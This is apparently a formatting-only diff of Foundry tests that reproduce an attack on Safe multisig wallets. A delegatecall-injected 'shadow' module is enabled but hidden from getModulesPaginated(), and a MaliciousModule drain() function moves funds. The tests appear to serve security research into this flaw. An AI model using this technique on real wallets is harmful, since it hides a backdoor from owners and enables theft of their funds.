@@ -14,12 +14,7 @@ import {ShadowModuleInjector} from "../src/ShadowModuleInjector.sol";
 contract MaliciousModule {
     function drain(address safe, address payable recipient, uint256 amount) external {
         // Modules call execTransactionFromModule as msg.sender — the Safe checks modules[msg.sender]
-        (bool success) = Safe(payable(safe)).execTransactionFromModule(
-            recipient,
-            amount,
-            "",
-            Enum.Operation.Call
-        );
+        (bool success) = Safe(payable(safe)).execTransactionFromModule(recipient, amount, "", Enum.Operation.Call);
         require(success, "Module execution failed");
     }
 }
@@ -90,7 +85,7 @@ contract ShadowModuleTest is Test {
         assertTrue(safe.isModuleEnabled(address(shadowModule)), "shadow module must pass isModuleEnabled()");
 
         // getModulesPaginated should NOT include the shadow module
-        (address[] memory listedModules, ) = safe.getModulesPaginated(SENTINEL, 10);
+        (address[] memory listedModules,) = safe.getModulesPaginated(SENTINEL, 10);
 
         bool shadowListed = false;
         for (uint256 i = 0; i < listedModules.length; i++) {
@@ -222,10 +217,8 @@ contract ShadowModuleViaExecTest is Test {
         assertFalse(safe.isModuleEnabled(address(shadowModule)), "module must not be enabled before injection");
 
         // Build the delegatecall tx to inject the shadow module
-        bytes memory injectCalldata = abi.encodeWithSelector(
-            ShadowModuleInjector.injectShadowModule.selector,
-            address(shadowModule)
-        );
+        bytes memory injectCalldata =
+            abi.encodeWithSelector(ShadowModuleInjector.injectShadowModule.selector, address(shadowModule));
         bytes memory signatures = _signDelegatecallTx(injectCalldata);
 
         bool success = safe.execTransaction(
@@ -233,7 +226,9 @@ contract ShadowModuleViaExecTest is Test {
             0,
             injectCalldata,
             Enum.Operation.DelegateCall,
-            0, 0, 0,
+            0,
+            0,
+            0,
             address(0),
             payable(address(0)),
             signatures
@@ -242,7 +237,7 @@ contract ShadowModuleViaExecTest is Test {
 
         // Post-check: module is enabled but hidden
         assertTrue(safe.isModuleEnabled(address(shadowModule)), "module must be enabled after injection");
-        (address[] memory listedModules, ) = safe.getModulesPaginated(address(0x1), 10);
+        (address[] memory listedModules,) = safe.getModulesPaginated(address(0x1), 10);
         for (uint256 i = 0; i < listedModules.length; i++) {
             assertTrue(listedModules[i] != address(shadowModule), "shadow module must not be listed");
         }
@@ -261,8 +256,16 @@ contract ShadowModuleViaExecTest is Test {
 
     function _signDelegatecallTx(bytes memory data) internal view returns (bytes memory) {
         bytes32 txHash = safe.getTransactionHash(
-            address(injector), 0, data, Enum.Operation.DelegateCall,
-            0, 0, 0, address(0), payable(address(0)), safe.nonce()
+            address(injector),
+            0,
+            data,
+            Enum.Operation.DelegateCall,
+            0,
+            0,
+            0,
+            address(0),
+            payable(address(0)),
+            safe.nonce()
         );
         return _sortAndSign(OWNER1_KEY, OWNER2_KEY, txHash);
     }
